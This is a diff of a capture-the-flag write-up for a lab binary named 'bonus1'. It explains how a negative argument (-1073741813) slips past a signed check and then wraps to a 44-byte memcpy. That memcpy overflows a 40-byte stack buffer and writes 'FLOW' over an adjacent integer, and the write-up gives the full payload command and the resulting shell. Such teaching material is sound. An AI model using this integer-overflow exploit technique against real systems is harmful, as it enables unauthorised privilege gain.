@@ -30,7 +30,7 @@ if (local_14 < 10)   // signed comparison !
 Negative numbers always pass this check :
 
 ```
--2147483637 < 10  → true ✓
+-1073741813 < 10  → true ✓
 ```
 
 ### Vulnerability 2 : integer overflow in memcpy size
@@ -39,74 +39,92 @@ Negative numbers always pass this check :
 memcpy(local_3c, argv[2], local_14 * 4)
 ```
 
-`memcpy` takes an **unsigned** size argument (`size_t`). When we multiply a negative signed integer by 4, the result wraps around in 32-bit unsigned arithmetic :
+`memcpy` takes an **unsigned** size argument (`size_t`). When we multiply a negative signed integer by 4, the result wraps around in 32-bit unsigned arithmetic.
+
+The 32-bit unsigned counter goes from **0 to 4294967295**, then wraps back to 0. The total number of values is **4294967296** (= 2^32).
 
 ```
-local_14 = -2147483637
-local_14 * 4 = -8589934548  (as signed 64-bit)
+think of it like a clock :
+0 ..................... 44 ................. 4294967295
+                        ↑
+if we want memcpy to copy 44 bytes
+we need a number that lands on 44 after wrapping
 
-as unsigned 32-bit (mod 2^32) :
--8589934548 % 4294967296 = 44  ← memcpy copies 44 bytes !
+4294967296 - 44 = 4294967252  ← this number wraps to 44 !
 ```
-
-This is exactly what we need — enough to overflow the 40-byte buffer and overwrite `local_14`.
 
 ---
 
-## Why -2147483637 Specifically
+## How to Find the Value -1073741813
 
-We need a value `n` where :
+### Step by step on the terminal
 
-```
-condition 1 : n < 10          (pass the signed check)
-condition 2 : (n * 4) mod 2^32 >= 44  (enough bytes to overflow)
-condition 3 : (n * 4) mod 2^32 minimal  (avoid copying too much)
-```
+We need `memcpy` to copy exactly **44 bytes** (40 buffer + 4 overwrite) :
 
-```python
-python3 -c "
-for n in range(-1, -2147483648, -1):
-    size = (n * 4) % (2**32)
-    if 44 <= size <= 100:
-        print(n, size)
-        break
-"
-# → -2147483637  size = 44
+```bash
+# step 1 : find the unsigned value that wraps to 44
+echo $((4294967296 - 44))
+# → 4294967252
+
+# step 2 : divide by 4 because memcpy receives local_14 * 4
+echo $((4294967252 / 4))
+# → 1073741813
+
+# step 3 : negate it because it must be negative to pass check < 10
+# n = -1073741813
 ```
 
-```
--2147483637 * 4 = -8589934548
--8589934548 mod 4294967296 = 44 bytes ✓
+### Why divide by 4
 
-44 bytes = 40 (buffer) + 4 (overwrite local_14)
-```
-
-### Why -2147483648 does NOT work
-
-```
--2147483648 * 4 = -8589934592
--8589934592 mod 4294967296 = 0  ← memcpy copies 0 bytes !
+```asm
+lea    0x0(,%eax,4),%ecx   ; ecx = local_14 * 4
 ```
 
-Nothing gets written — the buffer is never overflowed.
+The program multiplies `local_14` by 4 before passing to memcpy — so we divide our target by 4 to find the right input.
+
+### Verification
+
+```bash
+python3 -c "print((-1073741813 * 4) % (2**32))"
+# → 44 ✓
+
+python3 -c "print(-1073741813 < 10)"
+# → True ✓
+```
+
+### The wrapping explained
+
+```
+-1073741813 * 4 = -4294967252   (signed result)
+
+unsigned 32-bit sees :
+4294967296 - 4294967252 = 44   ← lands here on the counter !
+```
+
+```
+counter :
+0 ........... 44 ........... 4294967295
+              ↑
+              -4294967252 wraps here
+              because it is 44 steps from the start
+              and (4294967296 - 44) steps from the end
+```
 
 ---
 
 ## Stack Layout
 
-```c
-char local_3c[40];   // buffer  ← memcpy writes here
-int  local_14;       // integer ← needs to equal 0x574f4c46
+```asm
+lea    0x14(%esp),%eax         ; buffer = esp+0x14
+cmpl   $0x574f4c46,0x3c(%esp)  ; local_14 = esp+0x3c
 ```
 
 ```
-local_3c = ebp-0x3c   ← buffer start
-local_14 = ebp-0x14   ← integer to overwrite
+esp+0x14 = local_3c  ← buffer start (40 bytes)
+esp+0x3c = local_14  ← integer to overwrite
 
 distance = 0x3c - 0x14 = 0x28 = 40 bytes
 ```
-
-Exactly **40 bytes** of padding reaches `local_14`.
 
 ---
 
@@ -133,15 +151,15 @@ local_3c : [A * 40          ][0x574f4c46      ]
 ## Final Payload
 
 ```bash
-./bonus1 -2147483637 $(python -c "print('A'*40 + '\x46\x4c\x4f\x57')")
+./bonus1 -1073741813 $(python -c "print('A'*40 + '\x46\x4c\x4f\x57')")
 ```
 
 ### Payload breakdown
 
 ```
 argv[1] :
-  -2147483637       →  passes signed check (< 10)
-                    →  (-2147483637 * 4) mod 2^32 = 44
+  -1073741813       →  passes signed check (< 10)
+                    →  (-1073741813 * 4) mod 2^32 = 44
                     →  memcpy copies exactly 44 bytes
 
 argv[2] :
@@ -155,10 +173,11 @@ argv[2] :
 ## Full Execution Flow
 
 ```
-1. atoi("-2147483637")  → local_14 = -2147483637
-2. check : -2147483637 < 10 → true → continue
-3. memcpy size : -2147483637 * 4 = -8589934548
-                 mod 2^32 = 44 bytes
+1. atoi("-1073741813") → local_14 = -1073741813
+2. check : -1073741813 < 10 → true → continue
+3. memcpy size : -1073741813 * 4 = -4294967252
+                 unsigned 32-bit  = 44 bytes
+                 (4294967296 - 4294967252 = 44)
 4. memcpy copies 44 bytes into 40 byte buffer
    → overflows 4 bytes
    → local_14 = 0x574f4c46 ("FLOW")
@@ -172,7 +191,7 @@ argv[2] :
 ## Result
 
 ```bash
-./bonus1 -2147483637 $(python -c "print('A'*40 + '\x46\x4c\x4f\x57')")
+./bonus1 -1073741813 $(python -c "print('A'*40 + '\x46\x4c\x4f\x57')")
 $ whoami
 bonus2    ← shell obtained !
 ```
